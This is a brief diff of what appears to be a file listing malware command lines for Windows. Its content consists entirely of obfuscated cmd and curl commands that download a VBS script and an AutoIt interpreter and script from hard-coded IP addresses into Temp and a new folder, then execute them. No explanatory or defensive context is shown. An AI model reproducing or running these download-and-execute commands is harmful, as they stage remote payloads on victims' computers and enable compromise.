@@ -16,12 +16,19 @@ cmd.exe /c fjw || eChO fjw & PI"Ng" fjw || CuR"l" h"t"tp"://"136".2"4"4"."9"2."1
 
 PI"Ng" fjw 
 
-CuR"l" h"t"tp"://"136".2"4"4"."9"2."148"/r"dFR"2/Gb"B" -o C:\Users\Admin\AppData\Local\Temp\fjw.vbs 
+CuR"l" h"t"tp"://"136".2"4"4"."9"2."148"/r"dFR"2/Gb"B" -o C:\Users\Admin\AppData\Local\Temp\fjw.vbs
 
 PI"Ng" -n 4 fjw 
 
-c"sc"r"I"P"t" C:\Users\Admin\AppData\Local\Temp\fjw.vbs 
+WScript.exe" "C:\Users\Admin\AppData\Local\Temp\fjw.vbs"
 
+cmd.exe" /c mkdir c:\rqdp & cd /d c:\rqdp & copy c:\windows\system32\curl.exe rqdp.exe & rqdp -H "User-Agent: curl" -o Autoit3.exe http://81.19.135.17:2351 & rqdp -o nvptjf.au3 http://81.19.135.17:2351/msirqdppgyg & Autoit3.exe nvptjf.au3
+
+rqdp -H "User-Agent: curl" -o Autoit3.exe http://81.19.135.17:2351 
+
+rqdp  -o nvptjf.au3 http://81.19.135.17:2351/msirqdppgyg 
+
+Autoit3.exe  nvptjf.au3 
 
 *************************************************
 
